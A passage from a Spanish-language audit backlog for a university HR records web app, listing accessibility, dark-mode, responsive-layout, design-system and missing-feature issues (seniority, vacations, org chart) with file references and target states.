Esfuerzo: **S** · Archivos: `app/static/styles.css` `[CHOCA]`,
`app/static/hr.js`

### BR-104 · `::placeholder` sin contraste garantizado y usado como etiqueta

`app/static/hr.html:135` · `54` · `95`

**Hoy:** "Buscar expediente por Cédula, Nombres, Apellidos..." es sólo
`placeholder`. Desaparece al escribir, no lo lee el lector como nombre, y el
gris por defecto de Bootstrap (`#6c757d` sobre `#fff`) queda en 4,5:1 justo — y
por debajo si el fondo del campo cambia de tema.

**Debe pasar:** `<label class="sr-only">` real (o visible), y contraste
verificado del `placeholder`.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/styles.css`
`[CHOCA]`

### BR-105 · `::selection` no está definido

`app/static/styles.css` (transversal)

**Hoy:** el color de selección de texto es el del navegador. Sobre las
superficies oscuras de los temas puede quedar ilegible, y sobre el `mark`
amarillo de BR-097 se solapan dos resaltados.

**Debe pasar:** `::selection` con los colores del sistema de diseño y variante
oscura.

Esfuerzo: **S** · Archivos: `app/static/styles.css` `[CHOCA]`

### BR-106 · La animación de esqueleto no respeta `prefers-reduced-motion`

`app/static/hr.html:221-222`

**Hoy:** `@keyframes ds-shimmer` con `animation: 1.4s infinite` en un `<style>`
en línea de `hr.html`, fuera de la capa de movimiento de `styles.css` que
CLAUDE.md describe. Ni `body.ds-no-anim` ni `prefers-reduced-motion` la apagan.
WCAG 2.3.3 / 2.2.2 para movimiento persistente.

**Debe pasar:** la regla se mueve a la capa de movimiento de `styles.css`, con
sus dos interruptores.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/styles.css`
`[CHOCA]`

### BR-107 · `transform: translateY(-4px)` en `:hover` de la tarjeta con `transition: all`

`app/static/styles.css:566-582`

**Hoy:** `transition: all 0.3s` anima **todas** las propiedades, incluidas las
que no cambian, y el `translateY` sobre una lista de 50 tarjetas produce
repintados. Además 300 ms está por encima del rango 120–260 ms que CLAUDE.md fija
para la capa de movimiento.

**Debe pasar:** transición explícita de `transform`, `box-shadow` y
`background-color`, a 180 ms.

Esfuerzo: **S** · Archivos: `app/static/styles.css` `[CHOCA]`

### BR-108 · El zoom al 200 % rompe la fila de metadatos de la tarjeta

`app/static/hr.js:134-138`

**Hoy:** cédula, departamento y cargo van en `<span class="mr-3">` en una sola
línea con `font-size:0.82rem`. Al ampliar al 200 % (WCAG 1.4.4) el cargo largo
—"Profesor Asociado a Dedicación Exclusiva"— desborda o parte de forma
imprevisible, porque nada define el comportamiento de envoltura.

**Debe pasar:** rejilla o `flex-wrap` con separaciones definidas, verificado al
200 %.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

---

## 5. Estética y sistema visual

### BR-109 · El dossier se pinta desde JavaScript con estilos en línea

`app/static/hr.js:275-367` (todo el bloque)

**Hoy:** casi cien atributos `style` en línea en la plantilla del dossier:
colores (`#2b4e72`, `#eef4fb`), tamaños (`font-size:0.78rem`,
`width:150px`), separaciones (`gap:4px`), radios (`border-radius:10px`). Es la
causa raíz de la mitad de los pendientes de esta sección y de la siguiente: **el
modo oscuro y los doce temas no pueden alcanzar nada de esto**. CLAUDE.md ya lo
dice: "un color en un `style` en línea no lo arregla ninguna hoja de estilos".

**Debe pasar:** clases en `styles.css` con tokens, y `hr.js` emitiendo sólo
estructura y datos. Es el pendiente estructural del carril.

Esfuerzo: **L** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-110 · Modo oscuro roto en el dossier: fichas blancas sobre fondo oscuro

`app/static/styles.css:866` · `app/static/hr.js:500`

**Hoy:** `.rrhh-person-file-item { background:#ffffff; border:1px solid #dfe6ee }`
sin variante `body.dark-mode` (la hoja tiene 223 reglas de modo oscuro y ninguna
para esta clase). Escenario: en modo oscuro cada documento del expediente es un
rectángulo blanco brillante sobre fondo `#23272f`, con el texto `#485463` de
`.rrhh-person-file-meta` encima. Es la parte del sistema que más se mira.

**Debe pasar:** variantes de modo oscuro para `.rrhh-person-file-item`,
`.rrhh-person-file-meta`, `.rrhh-person-file-sub` y `.rrhh-person-photo-card`.

Esfuerzo: **S** · Archivos: `app/static/styles.css` `[CHOCA]`

### BR-111 · La cabecera del dossier fuerza `bg-white` en modo oscuro

`app/static/hr.js:276`

**Hoy:** `class="... bg-white rounded shadow-sm border"`. La hoja sí redefine
`.bg-white` en oscuro (`styles.css:2400`), pero deja el borde y la sombra claros,
y el `.badge-info` del estado (línea 285) no tiene variante. El resultado es una
cabecera a medio traducir.

**Debe pasar:** clase propia `.ds-person-profile-header` con su variante oscura,
en lugar de utilidades de Bootstrap.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-112 · El esqueleto de carga es gris claro fijo

`app/static/hr.html:221` · `app/static/hr.js:10`

**Hoy:** el degradado `#e9ecef → #f8f9fa → #e9ecef` y el círculo `#e9ecef` del
avatar. En modo oscuro son tres barras muy claras destellando sobre fondo
oscuro: llamativo y desagradable.

**Debe pasar:** el esqueleto usa tokens de superficie con variante oscura.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/styles.css`
`[CHOCA]`

### BR-113 · La cabecera de la caja de facetas usa un azul claro fijo

`app/static/hr.js:654`

**Hoy:** `style="background:#f4f9ff"`. En oscuro, franja blanquecina. Mismo caso
en `hr.html:77` (`background:#f4f9ff` del prefijo del campo de fecha) y
`hr.html:79` (`background:#fff` del campo de rango).

**Debe pasar:** tokens.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/hr.html`,
`app/static/styles.css` `[CHOCA]`

### BR-114 · Los bordes y sombras de los modales están escritos en el HTML

`app/static/hr.html:162` · `app/static/hr.html:176`

**Hoy:** `style="border-radius:14px; border:1px solid #d6dbe1; box-shadow:0 18px
40px rgba(16,24,40,0.2)"` duplicado en los dos modales. El radio 14 px no
coincide con ningún otro del sistema (las fichas usan 10 px, las tarjetas 8 px),
el borde claro se ve en oscuro, y la duplicación garantiza que se separen.

**Debe pasar:** una clase, con el radio del sistema.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/styles.css`
`[CHOCA]`

### BR-115 · Cuatro radios de borde distintos en la misma pantalla

`styles.css:572` (8px) · `styles.css:871` (10px) · `hr.html:162` (14px) ·
`hr.js:140` (10px de insignia) · `hr.js:142` (8px) · `hr.js:126` (50%)

**Hoy:** 8, 10, 14 px y píldoras, sin criterio. Las insignias de la misma fila
usan 10 px la de estado y 8 px las de tipo.

**Debe pasar:** una escala de radios en tokens (`--radius-sm/md/lg/pill`) y
aplicarla.

Esfuerzo: **M** · Archivos: `app/static/styles.css` `[CHOCA]`,
`app/static/hr.js`

### BR-116 · Cinco tamaños de letra por debajo de 0,8 rem en una sola tarjeta

`app/static/hr.js:133` (1,05rem) · `134` (0,82rem) · `140-141` (0,73rem) ·
`142` (0,68rem)

**Hoy:** 0,68 rem son ~10,9 px. En la caja de facetas hay 0,72 rem y 0,68 rem
más (`hr.js:639`, `658`). Con el escalado de fuente de la aplicación al mínimo
quedan por debajo de 10 px. No hay escala tipográfica: hay quince valores
sueltos.

**Debe pasar:** escala de 5 o 6 pasos en tokens, mínimo 0,75 rem para texto de
apoyo y 0,8 rem para cualquier cosa que se lea.

Esfuerzo: **M** · Archivos: `app/static/styles.css` `[CHOCA]`,
`app/static/hr.js`

### BR-117 · Tres colores de acordeón sin significado: `text-lightblue`, `text-teal`, `text-indigo`

`app/static/hr.html:50` · `60` · `91`

**Hoy:** Tipología en azul claro, Fecha en verde azulado, Estado en índigo. Los
tres son la misma clase de cosa —un filtro— y el color sugiere una categoría que
no existe. Además `text-lightblue` y `text-indigo` son clases de AdminLTE: como
AdminLTE **no se carga** (CLAUDE.md lo advierte expresamente), hay que
comprobar si `styles.css` las define; si no, los tres títulos salen del mismo
color y el gesto es puro ruido en el marcado.

**Debe pasar:** un solo color para los tres títulos de filtro.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-118 · Las 4 Partes tienen un color en `hr.js`, otro en `hr.py` y ninguno en `styles.css`

`app/static/hr.js:372-377` · `app/routes/hr.py:495-500`

**Hoy:** los mismos cuatro colores (`#0d6efd`, `#198754`, `#fd7e14`, `#6f42c1`)
duplicados literalmente en dos archivos, en dos lenguajes. Son los colores de
Bootstrap 5, que este proyecto no usa. No están en los tokens `--viz-*` ni tienen
variante oscura, y su contraste no está verificado (el naranja `#fd7e14` con
blanco da 2,9:1: la insignia de conteo de la Parte III es ilegible,
`hr.js:474`).

**Debe pasar:** los colores de las Partes son tokens en `styles.css`, con
variante oscura y contraste verificado; el backend los lee de un único sitio o
deja de usarlos (BR-061 los saca del reporte).

Esfuerzo: **M** · Archivos: `app/static/styles.css` `[CHOCA]`,
`app/static/hr.js`, `app/routes/hr.py`

### BR-119 · El nombre canónico de las 4 Partes está triplicado

`app/static/hr.js:372-377` · `app/routes/hr.py:495-500` · base de datos
(`categoria.nombre`)

**Hoy:** tres fuentes de verdad para "Parte I — Ingreso y Contratación". Si
alguien renombra la categoría en el catálogo, el dossier sigue mostrando el
nombre codificado y el reporte pierde el color. Es la causa directa de BR-016.

**Debe pasar:** el nombre viene del catálogo; el frontend sólo aporta el orden y
el icono, indexados por `slug`.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/routes/hr.py`

### BR-120 · La foto del listado y la del dossier tienen bordes distintos y sin criterio

`app/static/hr.js:126` (2 px del color del estado) · `styles.css:779` (3 px
blanco)

**Hoy:** en la lista el anillo de la foto codifica el estado laboral; en el
dossier es blanco y no codifica nada. El usuario aprende un lenguaje visual en
una pantalla y lo pierde en la siguiente.

**Debe pasar:** el mismo anillo de estado en ambas, o en ninguna.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-121 · La foto del dossier ocupa 150 px y no es ampliable

`app/static/hr.js:278` · `app/static/styles.css:779-797`

**Hoy:** 150 px recortada en círculo con `object-fit: cover`. Para identificar a
una persona en un trámite es poco, y no hay forma de verla completa. El recorte
circular además corta la parte superior de la cabeza en las fotos tipo carné,
que es justo el formato que tendrán.

**Debe pasar:** clic para ampliar, y evaluar recorte rectangular con relación
3:4, que es el estándar de foto de expediente.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-122 · `rrhh-person-photo-icon` está declarado y oculto: código muerto

`app/static/styles.css:817-819` · `app/static/hr.js:250`

**Hoy:** el fallback pinta a la vez las iniciales y un `<i class="fas fa-user">`
que la hoja oculta con `display:none`. Dos elementos, uno invisible.

**Debe pasar:** quitar el icono y su regla, o decidir cuál de los dos es el
fallback.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-123 · El estado vacío es un `alert-secondary` genérico

`app/static/hr.js:97-100`

**Hoy:** una caja gris con un icono de personas y una frase. No propone ninguna
acción: ni "limpiar filtros" (que es un botón que existe, `hr.html:138`), ni
"registrar un expediente" para quien tiene permiso, ni muestra qué filtros están
aplicados.

**Debe pasar:** estado vacío con las fichas de los filtros activos, un botón de
limpiar y —si el usuario es admin— el acceso al alta.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-124 · El estado vacío del dossier es una sola línea gris

`app/static/hr.js:436`

**Hoy:** "No se encontraron archivos con estos filtros en el expediente."
Igual de mudo, y además puede aparecer por el bug de BR-016, en cuyo caso miente.

**Debe pasar:** acción de limpiar el filtro interno y recuento de lo que hay sin
filtrar.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-125 · No hay estado vacío para "el expediente no tiene ni un documento"

`app/static/hr.js:383-438`

**Hoy:** un empleado recién creado (el sistema los crea automáticamente como
"Por Asignar" al subir un documento, según `docs/funcionalidades.md`) llega al
dossier con `rows` conteniendo una fila con los campos de documento vacíos —
porque el `LEFT JOIN` de `fetch_hr_dataframe` produce una fila por empleado sin
documentos. Esa fila se pinta como un documento llamado "Documento sin tipo"
(`hr.js:380`). Escenario: el expediente vacío aparenta tener un documento
fantasma.

**Debe pasar:** detectar la fila sintética (`id_rrhh` nulo) y mostrar un estado
vacío real: "Expediente sin documentos registrados", con el acceso al alta.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/routes/hr.py`

### BR-126 · No hay estado de carga para las facetas

`app/static/hr.js:624-630`

**Hoy:** el panel de Distribución desaparece y reaparece con cada búsqueda,
haciendo saltar toda la columna de filtros. Sin esqueleto ni altura reservada.

**Debe pasar:** altura reservada y esqueleto, o mantener los valores anteriores
atenuados mientras llegan los nuevos.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-127 · Jerarquía invertida en la tarjeta: el conteo de documentos pesa como el estado

`app/static/hr.js:140-142`

**Hoy:** tres tipos de insignia en la misma fila con el mismo tamaño: estado
laboral (dato de identidad), número de documentos (dato de volumen) y hasta tres
tipos de documento (dato de detalle). El ojo no sabe qué mirar primero, y los
tipos de documento —lo menos importante— son los que más espacio ocupan.

**Debe pasar:** el estado destacado; el conteo como texto secundario; los tipos,
si acaso, en la vista de detalle.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-128 · Los tipos de documento se cortan a tres sin decir cuántos faltan

`app/static/hr.js:142`

**Hoy:** `.slice(0,3)`. Un expediente con veinte tipos muestra tres, sin "+17".
El usuario asume que hay tres.

**Debe pasar:** insignia "+N" con el resto en el `title` o al pasar por encima.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-129 · La rejilla de datos del dossier usa `col-6` fijo

`app/static/hr.js:302-310`

**Hoy:** ocho campos en `col-6`. En una pantalla ancha (1440 px, con el modal a
1080 px) quedan dos columnas larguísimas con mucho blanco entre etiqueta y
valor; en móvil siguen siendo dos columnas y "Nivel Educ.: Doctorado" no cabe
(ver BR-141). No hay `col-md-*` ni `col-lg-*` en ninguno.

**Debe pasar:** rejilla CSS con `auto-fit` y ancho mínimo, que resuelve los tres
tamaños sin puntos de corte.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-130 · La alineación etiqueta/valor no es consistente en el dossier

`app/static/hr.js:302-310` vs `app/static/hr.js:532-540`

**Hoy:** en la cabecera del dossier es `<strong>Etiqueta:</strong> valor` en
línea; en el modal de documento es una rejilla `.ds-doc-meta-row` con columnas
`k`/`v`. Dos maneras de presentar exactamente lo mismo, a dos clics de
distancia.

**Debe pasar:** un solo componente de par etiqueta/valor.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-131 · El campo "N/A" aparece siete veces en un expediente incompleto

`app/static/hr.js:303-304` · `511-513` · `537-538`

**Hoy:** RIF, Adscripción, Dependencia, Estatus, Ubicación y Personas vinculadas
muestran "N/A" cuando faltan. Una cuadrícula de "N/A" no informa: no distingue
"no aplica" de "no registrado", que en un expediente son cosas muy distintas
(una es correcta, la otra es una tarea pendiente).

**Debe pasar:** ocultar los campos que no aplican y marcar en otro color los que
faltan y deberían estar (enlaza con BR-136, el índice de completitud).

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-132 · "Sin cargo asignado" viaja como si fuera un cargo

`app/routes/hr.py:235-236` · `app/main.py:369`

**Hoy:** la vista hace `COALESCE(c.nombre, 'Sin cargo asignado')` y el endpoint
lo repite. Ese texto entra en el `tsvector` de búsqueda (`hr.py:136`): buscar
"asignado" devuelve a todos los empleados sin cargo. También se exporta al CSV
como si fuera un valor real.

**Debe pasar:** `NULL` en el dato, texto de ausencia sólo en la presentación.

Esfuerzo: **S** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr.py`,
`app/static/hr.js`

### BR-133 · La miga de pan dice "Comunidades / RRHH / Privado" sin que eso signifique nada

`app/static/hr.html:37`

**Hoy:** texto fijo, no navegable, heredado de otra aplicación. "Comunidades" no
es un concepto de este sistema, y "Privado" no corresponde a ningún estado real
(la búsqueda es, de hecho, pública — BR-001).

**Debe pasar:** miga real y navegable, o quitarla.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-134 · "Resultados de Búsqueda" es un título que no dice nada

`app/static/hr.html:144`

**Hoy:** encabezado fijo. En una pantalla que sólo hace eso, el título no aporta;
el espacio serviría para mostrar los filtros activos.

**Debe pasar:** el encabezado refleja el estado: "27 expedientes · Química ·
Activo", con fichas para quitar cada filtro.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`

### BR-135 · No hay fichas de filtro activo en ningún sitio

`app/static/hr.html:133-146`

**Hoy:** con tres filtros aplicados y los acordeones plegados, la pantalla no
muestra por ningún lado qué está filtrando. El único indicio es el contador. El
botón "Limpiar" es todo o nada.

**Debe pasar:** fila de fichas con "×" por filtro, encima de los resultados.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/static/hr.html`,
`app/static/styles.css` `[CHOCA]`

---

## 6. Responsive, modo oscuro y densidad

### BR-136 · La regla móvil apunta a `col-sm-6` y el marcado emite `col-6`

`app/static/styles.css:1012-1015` · `app/static/hr.js:302-310`

**Hoy:** `.ds-person-info .row .col-sm-6 { flex: 0 0 100% }` no encuentra nada,
porque `hr.js` emite `col-6`. Escenario a 390 px: los datos del empleado se
quedan a dos columnas de 165 px, y "Nivel Educ.: Doctorado en Ciencias" o
"Adscripción: Departamento de Estudios Ambientales" se parten en cinco líneas.
La regla existe, se escribió para arreglar esto, y no aplica.

**Debe pasar:** que la regla y el marcado coincidan — y mejor, BR-129, que
elimina el problema.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-137 · A 390 px el panel de filtros ocupa una pantalla entera antes de los resultados

`app/static/hr.html:43-129`

**Hoy:** `col-md-3` se convierte en ancho completo en móvil, así que el orden
vertical es: miga → Filtros (tres acordeones + botón) → Distribución → Vista
(dos desplegables) → **luego** el buscador y los resultados. En un teléfono hay
que desplazar dos pantallas para llegar a lo que se vino a hacer.

**Debe pasar:** en móvil, el buscador primero y los filtros en un panel
desplegable ("Filtros (3)") o una hoja inferior.

Esfuerzo: **M** · Archivos: `app/static/hr.html`, `app/static/hr.js`,
`app/static/styles.css` `[CHOCA]`

### BR-138 · La barra de búsqueda con tres botones se estrecha a 390 px

`app/static/hr.html:133-142`

**Hoy:** `input-group` con el campo y tres botones de icono. A 390 px los tres
botones (≈40 px cada uno más separaciones) dejan al campo unos 250 px, en el que
no cabe ni el `placeholder`. El botón de exportar, que es la acción menos
frecuente, ocupa lo mismo que buscar.

**Debe pasar:** en móvil, el campo a ancho completo y las acciones secundarias
en un menú.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/styles.css`
`[CHOCA]`

### BR-139 · El modal del expediente ocupa toda la pantalla menos los márgenes en móvil

`app/static/hr.html:161` (`modal-xl`) · `styles.css:764-771`

**Hoy:** `max-width:1080px` y `max-height:78vh` en la hoja, más un
`max-height:80vh` **en línea** en `hr.html:163` que la contradice. A 390 px el
`modal-xl` de Bootstrap 4 deja márgenes laterales mínimos y el contenido, con su
padding de `p-4`, queda con menos de 340 px útiles para una rejilla de dos
columnas (BR-136).

**Debe pasar:** en móvil, el dossier a pantalla completa con su propia barra
superior y botón de cerrar fijo.

Esfuerzo: **M** · Archivos: `app/static/hr.html`, `app/static/styles.css`
`[CHOCA]`

### BR-140 · El botón "Cerrar" del dossier está al final de un cuerpo desplazable

`app/static/hr.html:166-168`

**Hoy:** el pie del modal está fuera del área desplazable, así que sí queda fijo
— pero en móvil, con el teclado abierto por el buscador interno, el pie se sale
de la ventana visible. No hay X en la esquina superior (no hay cabecera, BR-078).

**Debe pasar:** X en la esquina, siempre visible.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-141 · Los tres desplegables de "Explorar Documentos" no caben a 390 px

`app/static/hr.js:339-361`

**Hoy:** `col-md-5`, `col-md-4`, `col-md-3`. Por debajo de 768 px se apilan a
ancho completo — correcto — pero con `mb-2` cada uno, ocupando 150 px de alto
antes del primer documento, dentro de un modal ya estrecho.

**Debe pasar:** en móvil, campo de búsqueda visible y los otros dos en un
desplegable de "Ordenar y filtrar".

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-142 · Las pestañas de las 4 Partes desbordan horizontalmente en móvil

`app/static/hr.js:486`

**Hoy:** `<ul class="nav nav-tabs">` con cuatro pestañas cuyos textos son
"Parte I", "Parte II", "Parte III", "Parte IV" (el `replace(/ — .+/, "")` de la
línea 473 los acorta, bien) más un icono y una insignia de conteo cada una. A
390 px son ~380 px de pestañas: al límite, y con cinco grupos (cuando hay
documentos "Sin clasificar") desborda. `nav-tabs` de Bootstrap 4 no tiene
desplazamiento horizontal: se envuelven, rompiendo la línea de la pestaña
activa.

**Debe pasar:** contenedor con desplazamiento horizontal y sombras de borde, o
un desplegable en móvil. CLAUDE.md exige verificar 390 px sin desborde.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-143 · La tabla de historial de cargos no está envuelta en `.table-responsive`

`app/static/hr.js:594-615`

**Hoy:** una `<table>` de cuatro columnas (Cargo, Desde, Hasta, Motivo) dentro
de un `div` con `bg-light rounded p-2`, sin envoltorio de desplazamiento. Con un
motivo largo desborda el modal a 390 px. CLAUDE.md lo dice literalmente: "Si una
tabla puede no caber, envuélvela en `.table-responsive`".

**Debe pasar:** `.table-responsive`, o presentación en fichas apiladas en móvil.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-144 · A 1440 px la columna de resultados desperdicia la mitad del ancho

`app/static/hr.html:132`

**Hoy:** `col-md-9` sin `max-width`. En una pantalla de 1440 px cada tarjeta
mide más de 1000 px de ancho para mostrar un nombre, una cédula y tres
insignias: líneas larguísimas y un vacío enorme entre la metadata y los botones
de acción. La longitud de línea cómoda son 60–80 caracteres.

**Debe pasar:** ancho máximo de contenido, o aprovechar el espacio con una
vista de dos columnas de tarjetas o columnas adicionales (antigüedad,
completitud).

Esfuerzo: **M** · Archivos: `app/static/hr.html`, `app/static/styles.css`
`[CHOCA]`

### BR-145 · La densidad compacta no toca nada de RRHH

`app/static/styles.css:2830-2840`

**Hoy:** `body.ds-density-compact` ajusta `.card-body`, `.table`, `.btn-sm`,
`.ds-item-card` y `.modal-body`. Pero todo el interior de la tarjeta de persona
y del dossier lleva separaciones en línea desde `hr.js` (`padding-left:15px`,
`gap:4px`, `mt-2`, `mb-2`, `p-3`), que la clase compacta no alcanza. Resultado:
activar densidad compacta apenas cambia la pantalla que más filas muestra.

**Debe pasar:** las separaciones en tokens, con variante compacta. Depende de
BR-109.

Esfuerzo: **M** · Archivos: `app/static/styles.css` `[CHOCA]`,
`app/static/hr.js`

### BR-146 · No existe una vista de tabla densa para el listado

`app/static/hr.js:119`

**Hoy:** sólo hay tarjetas de ~110 px de alto. Diez por página son 1100 px: hay
que desplazar para ver la página completa. Quien procesa nóminas o revisa cien
expedientes necesita una tabla de filas de 32 px con las columnas que le
importan.

**Debe pasar:** alternador tarjeta/tabla, recordado por usuario, con columnas
elegibles.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/static/hr.html`,
`app/static/styles.css` `[CHOCA]`

### BR-147 · La sombra del `:hover` de la tarjeta es negra en todos los temas oscuros

`app/static/styles.css:2427`

**Hoy:** sí hay una variante oscura (`rgba(0,0,0,0.35)`), lo cual está bien; el
problema es que los doce temas de color redefinen la sombra del `:hover` cada
uno con su tinte (`styles.css:1424`, `1442`, `1460`…) pero **sólo en claro**:
`body.dark-mode.theme-dorado` hereda la del tema, con `!important`, que es
dorada sobre fondo oscuro. Combinatoria de 12 temas × 2 modos sin verificar.

**Debe pasar:** las sombras salen de un token que cambia con el modo, no de doce
reglas con `!important`.

Esfuerzo: **M** · Archivos: `app/static/styles.css` `[CHOCA]`

---

## 7. Funcionalidad ausente frente a SuccessFactors, Workday, BambooHR y la
## normativa venezolana

Esta sección es la distancia real entre lo que hay y "el mejor sistema de
gestión de RRHH educativo del mundo". Ninguno de estos pendientes es un arreglo:
todos son producto.

### BR-148 · No se calcula la antigüedad, que es el dato que ordena todo lo demás

`app/static/hr.js:305` · `app/routes/hr.py:452`

**Hoy:** se muestra "Ingreso: 14/03/1998" y ya. La antigüedad es el eje del
escalafón universitario, del cálculo de vacaciones (LOTTT art. 190: 15 días el
primer año, +1 por año hasta 30), de las prestaciones sociales (art. 142), de
los bonos de antigüedad y del derecho a jubilación. Que el usuario la calcule
de cabeza en cada consulta es el fallo funcional más grande de la pantalla.

**Debe pasar:** antigüedad en años y meses, calculada en el servidor, visible en
la tarjeta y en el dossier, ordenable y filtrable. Con nota de si hay
interrupciones de servicio (que la LOTTT trata de forma específica).

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/static/hr.js`,
`app/main.py` `[CHOCA]`

### BR-149 · No hay checklist de completitud del expediente

`app/static/hr.js:207-230`

**Hoy:** lo más parecido son los cuatro botones de "Documentos de Identidad",
que buscan cédula, RIF, CV y planilla comparando **subcadenas de texto**
(`findPersonKeyDoc`, línea 194) — un método que falla en cuanto alguien
escribe "C.I." en vez de "Cédula". No hay ninguna noción de qué documentos
**debe** tener un expediente completo según su tipo de personal, ni de cuáles
faltan.

**Debe pasar:** catálogo de documentos obligatorios por tipo de personal
(docente ordinario, contratado, administrativo, obrero), indicador de
completitud por expediente (0-100 %) visible en la tarjeta, lista de faltantes
en el dossier y un informe de expedientes incompletos. Es la funcionalidad que
BambooHR llama *onboarding checklist* y la que convierte un archivo en una
herramienta de gestión.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr.py`,
`app/static/hr.js`, `app/static/styles.css` `[CHOCA]`

### BR-150 · No hay organigrama ni relación de supervisión

Transversal · `app/main.py:362` (la vista no tiene `supervisor_id`)

**Hoy:** hay `departamento`, y nada más. No se sabe quién reporta a quién, ni
quién dirige un departamento, ni cuántas personas tiene a cargo un jefe. Es la
funcionalidad de cabecera de Workday y BambooHR.

**Debe pasar:** `supervisor_id` en `empleados`, vista de organigrama navegable,
y en el dossier "Reporta a" y "Equipo a cargo".

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr.py`,
`app/static/hr.js` (o pantalla nueva)

### BR-151 · No se modela la categoría docente ni el escalafón

Transversal

**Hoy:** el escalafón universitario venezolano —Instructor → Asistente →
Agregado → Asociado → Titular, con tiempos mínimos de permanencia y trabajo de
ascenso— se guarda como texto libre en `cargos.nombre` (BR-066). No hay fecha de
ingreso al escalafón, ni fecha del último ascenso, ni tiempo cumplido en la
categoría actual, ni alerta de elegibilidad para ascenso.

**Debe pasar:** categoría como entidad con sus reglas, historial de ascensos
separado del historial de cargos, y alerta "cumple tiempo para ascender a
Agregado en 3 meses". La Parte II del expediente se llama "Escalafón y
Desarrollo" y hoy no contiene escalafón: contiene documentos sueltos.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr.py`,
`app/static/hr.js`

### BR-152 · No se modela la dedicación

Transversal

**Hoy:** Exclusiva, Tiempo Completo, Medio Tiempo y Convencional determinan
sueldo, obligaciones y compatibilidades, y no existen como campo. Van dentro del
texto del cargo, si acaso.

**Debe pasar:** campo propio con historial (la dedicación cambia), filtro y
faceta.

Esfuerzo: **M** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr.py`,
`app/static/hr.js`

### BR-153 · No hay gestión de vacaciones ni saldo de días

`app/routes/hr.py` (ausente)

**Hoy:** la Parte III se llama "Permisos y Formación" y sólo guarda documentos
escaneados. No hay saldo de vacaciones, ni días disfrutados, ni días pendientes,
ni el cálculo del artículo 190 de la LOTTT, ni el bono vacacional (art. 192).
Es la funcionalidad más usada de cualquier sistema de RRHH.

**Debe pasar:** módulo de vacaciones con saldo calculado por antigüedad,
registro de períodos disfrutados, y el saldo visible en el dossier.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/` (nuevo),
`app/static/hr.js`

### BR-154 · No hay gestión de permisos y reposos

`app/routes/hr.py` (ausente)

**Hoy:** un reposo médico es un PDF en la Parte III. No hay tipo de permiso
(remunerado, no remunerado, pre y postnatal —LOTTT art. 336 y 339—, permiso
paternal art. 339, año sabático), ni fechas de inicio y fin, ni efecto sobre la
antigüedad, ni quién autorizó.

**Debe pasar:** permisos como registros con tipo, fechas, estado y autorizante;
línea de tiempo en el dossier; y alerta de reincorporación próxima.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/` (nuevo),
`app/static/hr.js`

### BR-155 · No hay registro de concursos de oposición

Transversal

**Hoy:** el ingreso al personal ordinario de una universidad nacional es por
concurso de oposición o de credenciales. Ni el concurso, ni el jurado, ni el
veredicto, ni la fecha existen en el sistema — pese a que la Parte I se llama
"Ingreso y Contratación".

**Debe pasar:** entidad concurso vinculada al ingreso, con jurado, resultado y
sus documentos.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/` (nuevo)

### BR-156 · No hay evaluación de desempeño

Transversal

**Hoy:** nada. Es un módulo central en SuccessFactors y Workday, y en el ámbito
universitario tiene forma propia: evaluación estudiantil, informe de actividades
docentes, productividad en investigación.

**Debe pasar:** ciclos de evaluación, formularios, resultado histórico por
empleado, visible en la Parte II.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/` (nuevo),
pantalla nueva

### BR-157 · No hay comparación de expedientes

`app/static/hr.js` (ausente)

**Hoy:** para comparar dos empleados hay que abrir dos dossieres, uno tras otro
(y no se puede: el modal es único). Comparar es lo que se hace al evaluar
candidatos a un ascenso o al revisar equidad salarial dentro de un
departamento.

**Debe pasar:** selección múltiple en el listado y vista comparativa lado a
lado de los campos clave (antigüedad, categoría, dedicación, completitud).

